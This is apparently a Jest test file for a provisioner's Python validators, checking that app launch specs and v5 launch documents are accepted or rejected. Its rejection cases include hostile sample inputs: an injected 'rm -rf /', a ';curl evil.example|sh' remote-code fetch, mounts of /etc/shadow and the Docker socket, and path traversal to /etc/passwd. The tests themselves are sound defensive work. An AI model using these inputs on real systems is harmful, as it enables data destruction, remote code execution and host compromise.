import { spawnSync } from "node:child_process";
import path from "node:path";

import {
  buildCatalogAppLaunchSpec,
  UNIVERSAL_CATALOG_MANIFESTS,
} from "@/lib/hivra/catalog-manifests";

const PROVISIONER_DIR = path.join(process.cwd(), "provisioner");
const CATALOG_APP_SCRIPT = path.join(PROVISIONER_DIR, "hivra-catalog-app.py");
const INSTALL_AGENT_SCRIPT = path.join(PROVISIONER_DIR, "hivra-install-agent.py");

function runPython(args: string[], stdin: string) {
  return spawnSync("python3", ["-I", "-B", ...args], {
    input: stdin,
    encoding: "utf8",
    timeout: 15000,
  });
}

describe("provisioner hivra-catalog-app.py validator", () => {
  it.each(UNIVERSAL_CATALOG_MANIFESTS)("accepts the serialized launch spec for $id", (manifest) => {
    const spec = buildCatalogAppLaunchSpec(manifest);
    const res = runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(spec));
    expect(res.status).toBe(0);
    const parsed = JSON.parse(res.stdout);
    expect(parsed.appId).toBe(manifest.id);
    expect(parsed.runtime.kind).toBe(manifest.runtime.kind);
  });

  it("rejects forbidden container mounts, invalid ports, and shell metacharacters", () => {
    const base = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS.find((m) => m.id === "anythingllm")!);
    const cases = [
      { ...base, appId: "../escape" },
      { ...base, runtime: { ...base.runtime, hostPort: 8080 } },
      { ...base, runtime: { ...base.runtime, volumes: [{ name: "bad", mountPath: "/etc/shadow" }] } },
      { ...base, runtime: { ...base.runtime, volumes: [{ name: "sock", mountPath: "/var/run/docker.sock" }] } },
      { ...base, runtime: { ...base.runtime, imageRepo: "bad;rm -rf /" } },
      { ...base, runtime: { ...base.runtime, healthPath: "/../../etc/passwd" } },
    ];
    for (const bad of cases) {
      const res = runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(bad));
      expect(res.status).not.toBe(0);
    }
  });

  it("rejects arbitrary shell metacharacters in cli-web args and installers", () => {
    const base = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS.find((m) => m.id === "opencode")!);
    if (base.runtime.kind !== "cli-web" || !base.runtime.webService) throw new Error("expected cli-web");
    const badArgs = {
      ...base,
      runtime: {
        ...base.runtime,
        webService: {
          ...base.runtime.webService,
          args: ["web", ";curl evil.example|sh"],
        },
      },
    };
    expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(badArgs)).status).not.toBe(0);
  });

  it("accepts bounded cli-web setup commands and rejects malformed setup", () => {
    const base = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS.find((m) => m.id === "zeroclaw")!);
    if (base.runtime.kind !== "cli-web") throw new Error("expected cli-web");
    expect(base.runtime.setup?.commands.length).toBeGreaterThan(0);
    expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(base)).status).toBe(0);

    const badSetups = [
      { commands: ["line1\nline2"] },
      { commands: ["x".repeat(2001)] },
      { commands: [] },
      { commands: Array.from({ length: 17 }, () => "true") },
      { commands: "echo hi" },
      { commands: ["echo hi"], extra: true },
    ];
    for (const setup of badSetups) {
      const bad = { ...base, runtime: { ...base.runtime, setup } };
      expect(runPython([CATALOG_APP_SCRIPT, "validate"], JSON.stringify(bad)).status).not.toBe(0);
    }
  });
});

describe("hivra-install-agent.py launch document v5", () => {
  it("parses and validates a v5 catalog-app launch document", () => {
    const spec = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS[0]);
    const launchDoc = {
      version: 5,
      agentKind: "catalog-app",
      computerSubstrate: "proxmox-kvm",
      wantBrowser: false,
      modelKey: "",
      modelBaseUrl: "",
      model: "",
      tunnelToken: "tok_test_12345",
      accessHostname: null,
      catalogApp: spec,
    };
    const code = [
      "import importlib.util, json, sys",
      `spec = importlib.util.spec_from_file_location('install_agent', ${JSON.stringify(INSTALL_AGENT_SCRIPT)})`,
      "mod = importlib.util.module_from_spec(spec)",
      "spec.loader.exec_module(mod)",
      "parsed = mod.parse_launch(sys.stdin.buffer.read())",
      "print(json.dumps({'version': parsed['version'], 'agentKind': parsed['agentKind'], 'appId': parsed['catalogApp']['appId']}))",
    ].join("\n");
    const res = runPython(["-c", code], JSON.stringify(launchDoc));
    expect(res.status).toBe(0);
    expect(JSON.parse(res.stdout)).toEqual({
      version: 5,
      agentKind: "catalog-app",
      appId: spec.appId,
    });
  });

  it("rejects a v5 launch document with a mismatched agentKind or missing catalogApp", () => {
    const spec = buildCatalogAppLaunchSpec(UNIVERSAL_CATALOG_MANIFESTS[0]);
    const badDoc = {
      version: 5,
      agentKind: "claude",
      computerSubstrate: "proxmox-kvm",
      wantBrowser: false,
      modelKey: "",
      modelBaseUrl: "",
      model: "",
      tunnelToken: "tok_test_12345",
      accessHostname: null,
      catalogApp: spec,
    };
    const code = [
      "import importlib.util, sys",
      `spec = importlib.util.spec_from_file_location('install_agent', ${JSON.stringify(INSTALL_AGENT_SCRIPT)})`,
      "mod = importlib.util.module_from_spec(spec)",
      "spec.loader.exec_module(mod)",
      "mod.parse_launch(sys.stdin.buffer.read())",
    ].join("\n");
    expect(runPython(["-c", code], JSON.stringify(badDoc)).status).not.toBe(0);
  });
});
